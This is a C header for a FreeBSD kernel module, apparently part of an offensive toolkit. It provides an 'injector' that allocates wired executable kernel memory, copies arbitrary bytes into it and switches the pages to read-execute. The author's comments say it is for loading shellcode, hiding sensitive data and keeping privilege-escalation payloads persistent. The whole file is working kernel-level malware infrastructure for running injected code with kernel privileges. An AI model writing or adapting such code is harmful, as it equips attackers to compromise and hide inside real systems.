#ifndef INJECTOR_H
#define INJECTOR_H

#include <sys/param.h>
#include <sys/types.h>
#include <sys/systm.h>
#include <sys/libkern.h>
#include <sys/vmem.h>
#include <vm/vm_pagequeue.h>

#include <vm/vm.h>
#include <vm/vm_param.h>
#include <vm/pmap.h>
#include <vm/vm_page.h>
#include <vm/vm_object.h>
#include <vm/vm_kern.h>
#include <vm/vm_map.h>
#include <vm/vm_extern.h>

#include "common.h"
// for data/shellcode allocation and writing without touching kernel .text

enum injector_kind {
	INJECTOR_PMAP,
	INJECTOR_VMOBJ
};

struct injector {
	enum injector_kind kind;
	vmoffset kva;
	size len;
	vmpg * pages;
	int npages;
	vmobject obj;
};


// alternative to kva_alloc if you segfault. not sure why yet
static
vmoffset injector_kva_alloc (size total)
{
	vmem_addr_t addr;
	int error;

	if (vm_dom[0].vmd_kernel_rwx_arena==NULL)
		return (0);
	error = vmem_alloc(vm_dom[0].vmd_kernel_rwx_arena, total,
	    M_WAITOK|M_BESTFIT, &addr);
	if (error!=0)
		return (0);
	return ((vmoffset)addr);
}

static
void injector_kva_free (vmoffset kva, size total)
{
	vmem_free(vm_dom[0].vmd_kernel_rwx_arena, (vmem_addr_t)kva, total);
}

// allocate pmap pages. i recommend using this to write shellcode or other executable machine code
static
int injector_alloc_pmap (struct injector * inj, size len)
{
	size total;
	int npages;
	int i;

	if (len==0) return (EINVAL);
	total = roundup2(len, PAGE_SIZE);
	npages = total/PAGE_SIZE;

	inj->kva = injector_kva_alloc(total);
	if (inj->kva==0) return (ENOMEM);

	inj->pages = malloc(npages*sizeof(vmpg), M_TEMP, M_WAITOK|M_ZERO);
	inj->npages = npages;

	for (i = 0; i<npages; i++) {
		inj->pages[i] = vm_page_alloc_noobj(VM_ALLOC_WIRED|VM_ALLOC_ZERO);
		if (!inj->pages[i] || pmap_enter(kernel_pmap, inj->kva + i * PAGE_SIZE, inj->pages[i], VM_PROT_ALL, PMAP_ENTER_WIRED, 0)!=0) {

			for (int j = 0; j<=i; j++) {
				if (!inj->pages[j]) break;

				pmap_remove(kernel_pmap, inj->kva+j*PAGE_SIZE, inj->kva+(j+1)*PAGE_SIZE);

				vm_page_free(inj->pages[j]);
			}

			// look at me go
			free(inj->pages, M_TEMP);

			injector_kva_free(inj->kva, total);
			inj->kva = 0;
			inj->pages = NULL;
			inj->npages = 0;

			return (ENOMEM);
		}
		vmpgvalid(inj->pages[i]);
	}
	inj->kind = INJECTOR_PMAP;
	inj->len = total;
	return (0);
}

// use a vm_object. i recommend using this to hide sensitive data
static
int injector_alloc_vmobj (struct injector * inj, size len)
{
	size total = round_page(len);
	int npages = atop(total);

	inj->obj = vm_object_allocate(OBJT_SWAP, npages);
	if (inj->obj==NULL) return (ENOMEM);
	inj->kva = KERNBASE;
	int error = vm_map_find(kernel_map, inj->obj, 0, &inj->kva, total, 0, VMFS_OPTIMAL_SPACE, VM_PROT_ALL, VM_PROT_ALL, 0);
	
	if (error!=KERN_SUCCESS) {
		vm_object_deallocate(inj->obj);
		inj->obj = NULL;
		return (ENOMEM);
	}

	error = vm_map_wire(kernel_map, inj->kva, inj->kva+total, VM_MAP_WIRE_SYSTEM|VM_MAP_WIRE_NOHOLES);
	
	if (error!=KERN_SUCCESS) {
		vm_map_remove(kernel_map, inj->kva, inj->kva+total);
		vm_object_deallocate(inj->obj);
		inj->obj = NULL;
		inj->kva = 0;
		return (ENOMEM);
	}

	inj->kind = INJECTOR_VMOBJ;
	inj->len = total;
	return (0);
}

// allocate mem
static
int injector_alloc (struct injector * inj, enum injector_kind kind, size len)
{
	inj->kind = kind;
	inj->kva = 0;
	inj->len = 0;
	inj->pages = NULL;
	inj->npages = 0;
	inj->obj = NULL;
	if (kind==INJECTOR_PMAP)
		return (injector_alloc_pmap(inj, len));
	return (injector_alloc_vmobj(inj, len));
}

// write using an injector ctx ptr at offset with ptr to data of len
static
int injector_write (struct injector * inj, size off, const void* data, size len)
{
	if (off>inj->len||len>inj->len-off)
		return (EINVAL);
	memcpy((void*)(inj->kva+off), data, len);
	return (0);
}

// mprotect clone it just warps vm_map_protect
// https://man.freebsd.org/cgi/man.cgi?query=vm_map_protect&apropos=0&sektion=9&manpath=FreeBSD+14.5-RELEASE&format=html
static
int injector_protect (struct injector * inj, int prot)
{
	if (inj->kind==INJECTOR_PMAP) {
		int error = 0;
		for (int i = 0; i<inj->npages; i++) {
			error = pmap_enter(kernel_pmap, inj->kva+i*PAGE_SIZE, inj->pages[i],
			    prot, PMAP_ENTER_WIRED, 0);
			if (error!=0) return (ENOMEM);
		}
		return (0);
	}
	int error = vm_map_protect(kernel_map, inj->kva, inj->kva+inj->len, prot, 0, VM_MAP_PROTECT_SET_PROT);
	return (error!=KERN_SUCCESS ? ENOMEM : 0);
}

// rx it for shellcode 
static
int injector_rx (struct injector * inj)
{
	return (injector_protect(inj, VM_PROT_READ|VM_PROT_EXECUTE));
}

// make it rw for data
static
int injector_rw (struct injector * inj)
{
	return (injector_protect(inj, VM_PROT_READ|VM_PROT_WRITE));
}

// for cleanup after unload
// persistent injectors e.g. privesc should not call this before unloading or you risk a uaf 
static __unused
void injector_free (struct injector * inj)
{
	if (inj->kind==INJECTOR_PMAP) {
		if (inj->kva!=0) pmap_remove(kernel_pmap, inj->kva, inj->kva+inj->len);

		if (inj->pages!=NULL) {
			for (int i = 0; i<inj->npages; i++)
				if (inj->pages[i]!=NULL) vm_page_free(inj->pages[i]);
			free(inj->pages, M_TEMP);
		}

		if (inj->kva!=0) injector_kva_free(inj->kva, inj->len);
		
	} else if (inj->obj!=NULL) {
		vm_map_remove(kernel_map, inj->kva, inj->kva+inj->len);
		vm_object_deallocate(inj->obj);
	}
	inj->kva = 0;
	inj->len = 0;
	inj->pages = NULL;
	inj->npages = 0;
	inj->obj = NULL;
}

#endif
